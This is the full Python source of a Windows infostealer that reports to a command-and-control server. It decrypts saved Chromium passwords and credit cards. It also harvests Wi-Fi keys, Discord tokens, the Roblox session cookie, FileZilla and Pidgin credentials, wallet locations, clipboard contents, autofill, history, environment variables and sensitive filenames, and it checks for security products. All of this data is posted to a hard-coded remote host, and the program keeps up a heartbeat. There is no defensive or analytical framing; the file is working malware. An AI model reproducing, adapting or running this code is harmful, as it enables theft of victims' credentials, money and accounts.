# ==================================================================================================
# --- IMPORTS ---
# ==================================================================================================
import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
import uuid
import time
import requests
import threading
from datetime import datetime
import xml.etree.ElementTree as ET

try:
    import win32crypt
    from Crypto.Cipher import AES
    import pyperclip
    import browser_cookie3
except ImportError:
    pass

# ==================================================================================================
# --- CONFIGURATION ---
# ==================================================================================================
C2_URL = "https://datavault-c2.onrender.com" # THIS IS REPLACED BY THE BUILDER
HEARTBEAT_INTERVAL = 30

# ==================================================================================================
# --- HELPER FUNCTIONS ---
# ==================================================================================================
def run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception: return "N/A"

def get_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except Exception: return None

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(data[15:])[:-16].decode()
    except Exception: return ""

# ==================================================================================================
# --- REFINED HARVESTING FUNCTIONS ---
# ==================================================================================================
def p1_p2_p7_os_info():
    uname = platform.uname()
    return (f"OS Version:\t{uname.system} {uname.release} (Build: {platform.win32_ver()[1]})\n"
            f"Architecture:\t{platform.machine()}\n"
            f"Hostname:\t{socket.gethostname()}")

def p3_p4_p5_p6_hardware():
    info = f"CPU Model:\t{platform.processor()}\n"
    gpus = run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'caption']).replace("Caption", "").strip()
    info += f"GPU Model(s):\t{gpus}\n"
    info += f"Installed RAM:\t{psutil.virtual_memory().total / (1024**3):.2f} GB\n\n"
    info += "Disk Drives:\n"
    for p in psutil.disk_partitions():
        try: info += f"\t- {p.device} ({p.fstype}): {psutil.disk_usage(p.mountpoint).total / (1024**3):.2f} GB\n"
        except: continue
    return info

def p8_p9_user_uptime():
    uptime = str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
    users = run_command(['net', 'user']).replace("-------------------------------------------------------------------------------", "").strip()
    return f"Live Uptime:\t{uptime}\n\nUser Accounts:\n{users}"

def p10_p11_procs_apps():
    return (f"Running Processes:\n{'-'*20}\n{run_command(['tasklist'])}\n\n"
            f"Installed Applications:\n{'-'*25}\n{run_command(['wmic', 'product', 'get', 'name,version'])}")

def p12_security_products():
    av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName']).replace("displayName", "").strip()
    fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName']).replace("displayName", "").strip()
    return f"Antivirus Products:\n{av or 'Not Found'}\n\nFirewall Products:\n{fw or 'Not Found'}"

def p13_to_p16_network_info():
    return (f"Private IP:\t{socket.gethostbyname(socket.gethostname())}\n"
            f"Public IP:\t{run_command(['powershell', '(curl', '-s', 'ifconfig.me/ip)'])}\n"
            f"MAC Address:\t{':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n\n"
            f"ARP Table:\n{run_command(['arp', '-a'])}\n\n"
            f"Active Connections:\n{run_command(['netstat', '-an'])}\n\n"
            f"DNS Cache:\n{run_command(['ipconfig', '/displaydns'])}")

def p17_wifi_passwords():
    profiles = run_command(['netsh', 'wlan', 'show', 'profiles'])
    profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles)
    if not profile_names: return "No WiFi profiles found."
    output = ""
    for name in profile_names:
        name = name.strip()
        profile_info = run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'])
        password = re.search(r"Key Content\s*:\s(.*)", profile_info)
        output += f"SSID:\t{name}\nPassword: {password.group(1).strip() if password else 'N/A (Open Network)'}\n\n"
    return output

def harvest_browser_data(data_type):
    """Unified function to pull passwords, cc, history from Chromium browsers."""
    output = ""
    browser_paths = {
        'Chrome': os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        'Edge': os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        'Brave': os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
    }
    
    for browser, path in browser_paths.items():
        if not os.path.exists(path): continue
        
        # Get encryption key for the browser
        key = get_encryption_key(path)
        if not key:
            output += f"[{browser}] Could not get encryption key.\n"
            continue

        # Find all profiles (Default, Profile 1, etc.)
        profiles = [f for f in os.listdir(path) if f.startswith('Profile ') or f == 'Default']
        
        for profile in profiles:
            db_file, query = None, None
            if data_type == 'passwords':
                db_file = os.path.join(path, profile, "Login Data")
                query = "SELECT origin_url, username_value, password_value FROM logins"
            elif data_type == 'credit_cards':
                db_file = os.path.join(path, profile, "Web Data")
                query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"

            if not db_file or not os.path.exists(db_file): continue
            
            # Copy DB to temp location to avoid file lock
            temp_db = shutil.copy2(db_file, "temp.db")
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute(query)
                
                profile_header = f"[{browser} - {profile}]"
                found_data = False

                for row in cursor.fetchall():
                    if data_type == 'passwords':
                        if (password := decrypt_data(row[2], key)):
                            if not found_data: output += f"{profile_header}\n"; found_data = True
                            output += f"\tURL: {row[0]}\n\tUser: {row[1]}\n\tPass: {password}\n\n"
                    elif data_type == 'credit_cards':
                        if (cc_number := decrypt_data(row[3], key)):
                            if not found_data: output += f"{profile_header}\n"; found_data = True
                            output += f"\tName: {row[0]}\n\tExpires: {row[1]}/{row[2]}\n\tNumber: {cc_number}\n\n"
                conn.close()
            except sqlite3.OperationalError as e:
                if "database is locked" in str(e):
                    output += f"[{browser} - {profile}] Database is locked. Is the browser open?\n"
            finally:
                os.remove("temp.db")
                
    return output if output else "No data found."

def p21_browser_passwords(): return harvest_browser_data('passwords')
def p29_browser_credit_cards(): return harvest_browser_data('credit_cards')

def p22_p23_cookies():
    output = "Roblox Security Cookie (.ROBLOSECURITY):\n"
    roblox_found = False
    try:
        cj = browser_cookie3.load()
        for cookie in cj:
            if cookie.name == '.ROBLOSECURITY':
                output += f"\tDomain: {cookie.domain}\n\tValue: {cookie.value}\n"
                roblox_found = True
        if not roblox_found:
            output += "\tNot found.\n"
    except Exception as e:
        output += f"\tFailed to load cookies: {e}\n\tThis can happen if the browser is open or if permissions are restricted.\n"
    return output

def p24_discord_tokens():
    output = ""
    # Improved regex to match Discord tokens and avoid false positives
    regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}"
    for path in [os.path.join(os.environ["APPDATA"], p, "Local Storage", "leveldb") for p in ["discord", "discordcanary", "lightcord"]]:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file), errors='ignore') as f:
                        for line in f:
                            for token in re.findall(regex, line.strip()):
                                if token not in output:
                                    output += f"{token}\n"
    return output if output else "No tokens found."

def p25_p26_p27_messaging_ftp():
    output = ""
    # Telegram
    tdata_path = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
    output += f"Telegram Session:\n\t{ 'Found at ' + tdata_path if os.path.exists(tdata_path) else 'Not found.'}\n\n"
    # FileZilla
    output += "FileZilla Credentials:\n"
    try:
        path = os.path.join(os.environ["APPDATA"], "FileZilla", "recentservers.xml")
        if os.path.exists(path):
            tree = ET.parse(path)
            for server in tree.findall('.//Server'):
                host, port, user, password = server.find('Host').text, server.find('Port').text, server.find('User').text, base64.b64decode(server.find('Pass').text).decode()
                output += f"\tHost: {host}:{port}\n\tUser: {user}\n\tPass: {password}\n\n"
        else: output += "\tNot Found\n"
    except: output += "\tFailed to parse credentials.\n"
    # Pidgin
    output += "\nPidgin Credentials:\n"
    try:
        path = os.path.join(os.environ["APPDATA"], ".purple", "accounts.xml")
        if os.path.exists(path):
             tree = ET.parse(path)
             for acc in tree.findall('.//account'):
                 output += f"\tProtocol: {acc.find('protocol').text}\n\tUser: {acc.find('name').text}\n\tPass: {acc.find('password').text}\n\n"
        else: output += "\tNot Found\n"
    except: output += "\tFailed to parse credentials.\n"
    return output

def p28_p30_ssh_crypto():
    output = "SSH Keys:\n"
    ssh_path = os.path.join(os.environ["USERPROFILE"], ".ssh")
    if os.path.exists(ssh_path):
        keys = [f for f in os.listdir(ssh_path) if 'id_' in f]
        output += '\n'.join(['\t' + k for k in keys]) or "\tNo key files found in .ssh folder."
    else: output += "\t.ssh directory not found."
    
    output += "\n\nCryptocurrency Wallets:\n"
    wallet_paths = {
        "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"),
        "Atomic": os.path.join(os.environ["APPDATA"], "atomic"),
        "Metamask (Chrome Profile)": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
    }
    found_any = False
    for name, path in wallet_paths.items():
        if os.path.exists(path):
            found_any = True
            output += f"\t{name}: Found\n"
    if not found_any: output += "\tNo known wallet folders found."
    return output

def p31_sensitive_docs():
    output = ""
    keywords = ['password', 'seed', 'tax', 'private', 'key', 'mnemonic', '2fa', 'backup', 'account', 'login', 'wallet']
    search_dirs = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Downloads"]]
    found_files = []
    try:
        for s_dir in search_dirs:
            if os.path.exists(s_dir):
                for root, _, files in os.walk(s_dir):
                    if len(found_files) > 50: break
                    for file in files:
                        if file.endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx')) and any(kw in file.lower() for kw in keywords):
                            found_files.append(os.path.join(root, file))
    except Exception as e: return f"Error during file search: {e}"
    return "\n".join(found_files) if found_files else "No files with sensitive keywords found in user directories."

def p32_p33_p34_misc_data():
    output = "Clipboard Contents:\n"
    try: output += f"{pyperclip.paste()}\n\n"
    except: output += "Could not get clipboard data.\n\n"
    
    # Autofill - a simplified version
    output += "Browser Autofill (Chrome):\n"
    try:
        path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Web Data")
        if os.path.exists(path):
            temp_db = shutil.copy2(path, "autofill_temp.db")
            conn = sqlite3.connect(temp_db)
            output += "\n".join([f"\t{row[0]}: {row[1]}" for row in conn.cursor().execute("SELECT name, value FROM autofill")])
            conn.close(); os.remove("autofill_temp.db")
    except: output += "\tCould not retrieve autofill."
    
    # History - a simplified version
    output += "\n\nBrowser History (Chrome - Last 50):\n"
    try:
        path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "History")
        if os.path.exists(path):
            temp_db = shutil.copy2(path, "history_temp.db")
            conn = sqlite3.connect(temp_db)
            output += "\n".join([f"\t{row[1]}" for row in conn.cursor().execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")])
            conn.close(); os.remove("history_temp.db")
    except: output += "\tCould not retrieve history."
    return output

def p13_env_vars():
    try: return json.dumps(dict(os.environ), indent=2)
    except: return "Could not retrieve environment variables."

# ==================================================================================================
# --- MAIN PAYLOAD LOGIC ---
# ==================================================================================================
def harvest_all_data():
    data_sections = {
        "1. OS & Host Info": p1_p2_p7_os_info, "2. Hardware": p3_p4_p5_p6_hardware,
        "3. Users & Uptime": p8_p9_user_uptime, "4. Processes & Apps": p10_p11_procs_apps,
        "5. Security Products": p12_security_products, "6. Network Info": p13_to_p16_network_info,
        "7. Wi-Fi Passwords": p17_wifi_passwords, "8. Browser Passwords": p21_browser_passwords,
        "9. Browser Credit Cards": p29_browser_credit_cards, "10. Cookies (Roblox, etc.)": p22_p23_cookies,
        "11. Discord Tokens": p24_discord_tokens, "12. Messaging & FTP": p25_p26_p27_messaging_ftp,
        "13. SSH & Crypto": p28_p30_ssh_crypto, "14. Sensitive Docs (Filename)": p31_sensitive_docs,
        "15. Clipboard, History, Autofill": p32_p33_p34_misc_data, "16. Environment Variables": p13_env_vars,
    }
    final_report = ""
    for title, func in data_sections.items():
        try: final_report += f"--- {title} ---\n\n{func()}\n\n"
        except Exception as e: final_report += f"--- {title} ---\n\nAn error occurred: {e}\n\n"
    return final_report.strip()

def send_to_c2(endpoint, data):
    try:
        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=30); return True
    except requests.RequestException: return False

def maintain_presence(session_id):
    while True:
        send_to_c2("/api/heartbeat", {"session_id": session_id}); time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    harvested_data = harvest_all_data()
    registration_data = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
    if send_to_c2("/api/register", registration_data):
        threading.Thread(target=maintain_presence, args=(session_id,), daemon=True).start()
        while True: time.sleep(60)